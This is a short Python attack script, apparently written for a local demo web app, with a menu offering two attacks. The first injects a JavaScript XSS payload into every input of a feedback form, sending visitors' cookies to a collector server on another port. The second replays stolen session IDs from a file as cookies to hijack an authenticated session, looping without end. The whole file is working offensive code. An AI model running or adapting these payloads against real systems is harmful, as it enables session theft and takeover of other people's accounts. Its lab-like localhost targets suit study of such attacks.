from requests_html import *
from bs4 import BeautifulSoup
import random

def hijack():
    demo_session = HTMLSession()
    hijack_session = HTMLSession()
    page = demo_session.get("http://localhost:5000/protected")
    demo_content = page.content.decode()
    print(demo_content)
    lines = open("session_db.txt", "r").read().splitlines()
    session_id = random.choice(lines)
    print(session_id)
    session_cookie = {'session' : session_id}
    page_post = hijack_session.post("http://localhost:5000/protected", cookies=session_cookie)
    while True:
        page_get = hijack_session.get("http://localhost:5000/protected")
        content = page_get.content.decode()
        print(content)
        f = open("scraped_cookies.txt", "w")
        f.write(content)
        f.close()

def payload():
    payload_session = HTMLSession()

    page = payload_session.get('http://localhost:5000/feedback')
    soup = BeautifulSoup(page.content, "lxml")
    print(soup)
    payload = {}
    search = [(element['name']) for element in soup.find_all('input', attrs={'name': True})] # code from https://stackoverflow.com/a/23001729
    print(search)
    for x in search:
        payload.update({x : "<script>var i=new Image;i.src=\"http://localhost:3500/?\"+document.cookie;</script>"}) # javascript code from https://github.com/s0wr0b1ndef/WebHacking101/blob/master/xss-reflected-steal-cookie.md#2-silent-one-liner
    r = payload_session.post('http://localhost:5000/feedback',payload)
    print("Payload sent")

def main():
    flag = 1
    while flag == 1:
        choice = input("Deliver payload (1) or hijack session from session_db.txt (2): ")
        if choice == "1":
            flag = 0
            payload()
        elif choice == "2":
            flag = 0
            hijack()
        else:
            print("Invalid input")

main()
